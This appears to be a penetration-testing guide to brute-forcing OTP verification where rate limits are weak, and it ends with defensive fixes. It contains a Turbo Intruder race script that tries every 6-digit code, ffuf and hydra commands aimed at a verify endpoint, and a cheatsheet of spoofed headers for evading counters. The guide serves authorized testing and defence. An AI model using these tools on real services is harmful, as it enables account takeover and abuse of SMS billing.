# Brute-Force & Lack of Rate Limiting

OTP keyspaces are tiny:
- 4 digits → 10,000 codes
- 5 digits → 100,000 codes
- 6 digits → 1,000,000 codes
- 6 alphanumeric → ~2 billion (still small if no rate limit)

With a typical TTL of 5–10 minutes and zero rate limit, a 6-digit code is crackable in seconds over HTTP/2.

## What a healthy backend does

1. Lock the OTP slot after **3–5 wrong attempts** (per `user_id` + flow, not per IP).
2. After lockout: require a new OTP issuance, with a cool-down on issuance (e.g., 1 OTP per 60s, max 5 per hour).
3. Invalidate the OTP if total wrong attempts (across all sessions/IPs) exceeds threshold.
4. Use CAPTCHA / device-fingerprint / risk score on the verify endpoint for high-risk flows.

Any of these missing = bug.

## Test recipes

### #1 No counter at all
1. Submit 50 wrong OTPs in Burp Repeater. Response identical for #1 and #50? Counter is absent or per-request only.
2. Switch to Intruder. Payload type "Numbers" 000000–999999 (or seed with [`top-otps.txt`](#high-probability-otps)).
3. Stop the moment one returns the "success" response signature (different content-length / status / JSON).

### #2 Counter exists but per-IP
1. Send 5 wrong codes from IP A → locked.
2. Rotate IP (`X-Forwarded-For: 1.2.3.4`, `X-Real-IP`, `Forwarded:`, `CF-Connecting-IP`, `True-Client-IP`, `X-Originating-IP`) — many backends honor these headers from "trusted" proxies and many app servers are misconfigured to trust them from any source.
3. If header rotation re-opens the counter, you have unlimited attempts.

Also try:
- Different session cookies (issue fresh sessions between attempts).
- Different `User-Agent` / `Accept-Language` (rare but seen on naive fingerprint counters).

### #3 Counter resets on new OTP issue
1. Submit 4 wrong codes (threshold = 5).
2. Hit the OTP-resend endpoint — a *new* OTP is issued.
3. Counter for the *new* OTP is fresh (4 attempts available again).
4. Burn through all OTPs: while a new OTP is valid, the previous may also be valid (see [otp-reusability.md](otp-reusability.md) #2) — so you have N codes × M attempts simultaneously.

Optimal exploitation: every 4 wrong attempts, request a new OTP. If both codes remain valid, your effective keyspace shrinks geometrically.

### #4 Race-based bypass (HTTP/2 last-byte sync)
The counter increment is in a separate transaction from the OTP check. Fire N parallel requests through one HTTP/2 connection; they all read the counter as `0`, all check the OTP, and one of them lands on the right code before any of them commit the increment.

Burp Turbo Intruder template:
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=100,
                           engine=Engine.BURP2)
    for i in range(1000000):
        engine.queue(target.req, str(i).zfill(6), gate='race1')
    engine.openGate('race1')

def handleResponse(req, interesting):
    if req.status != 401:
        table.add(req)
```

### #5 OTP-issuance flood (DoS / cost amplification)
- Hammer `POST /send-otp` with the same `user_id` — no rate limit means SMS bill goes up, victim phone gets spammed (vendor liability).
- Hammer with iterating `phone` numbers — SMS pumping fraud, telco partners collect premium-rate kickbacks. Report and stop; never weaponize.

### #6 "Last code valid" widening
Some backends accept any OTP that's "recently issued" within the TTL window. Spam-issue 50 OTPs in 5 minutes; if the backend stores all 50 as valid, your brute-force success probability for any single guess is 50× higher.

## High-probability OTPs

When you can only afford a few hundred guesses (residual rate limit), start with non-random values often emitted by buggy generators or selected by humans for test accounts:

```
000000   123456   111111   222222   333333   444444
555555   666666   777777   888888   999999   012345
123123   654321   098765   121212   101010   789012
000001   100000   999998   159753   147258   369369
```

For time-seeded codes, derive from current Unix epoch: `int(now()) % 1000000` and nearby values.

## Tooling

- **Burp Intruder**: payload type Numbers, min 000000, max 999999, step 1, zero-pad to 6. Resource pool 50 threads. Sort by response length to spot the hit.
- **Turbo Intruder**: race-condition + millions of requests/min over HTTP/2.
- **ffuf**:
  ```
  ffuf -u https://target/verify -X POST -d 'otp=FUZZ&email=victim@x.com' \
       -w otps.txt -mc 200 -fs 145 -H 'Cookie: session=...' -t 100
  ```
- **hydra** (rare, but works for form-based OTP if you have time):
  ```
  hydra -l victim@x.com -P otps.txt target.com https-post-form \
        "/verify:email=^USER^&otp=^PASS^:F=Invalid"
  ```

## Counter-bypass header cheatsheet

Try each header alone and in combinations against the verify endpoint:
```
X-Forwarded-For: 127.0.0.1
X-Forwarded-For: 127.0.0.1, 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Host: 127.0.0.1
True-Client-IP: 127.0.0.1
CF-Connecting-IP: 127.0.0.1
Forwarded: for=127.0.0.1
Via: 127.0.0.1
```
Also try IPv6 (`::1`), randomized RFC1918 ranges, and different IPs per request (Burp Intruder "Pitchfork" with an IP payload).

## Stopping rule

The instant one OTP returns a success-shaped response, **stop**. Do not enumerate further. Capture the request/response pair and move to impact confirmation. Continuing past the first hit:
- generates noise that aids defenders' forensics against your account,
- may trigger account lockout that wipes the evidence,
- in some scopes counts as "going beyond authorized testing."

## Defensive note

- Counter must be keyed `(user_id, flow_id, otp_id)` — never per-IP only.
- Use atomic compare-and-increment in the same transaction as the OTP check; reject before the check if attempts ≥ threshold.
- Invalidate OTP on N wrong attempts and require fresh issuance.
- Rate-limit OTP issuance: max 1 per 30s, 5 per hour, 20 per day per account.
- Ignore `X-Forwarded-For` from untrusted hops; only honor it from your own edge proxy.
- Log every wrong-OTP submission with `(user_id, otp_id, ip, ua, time)` for fraud analytics.
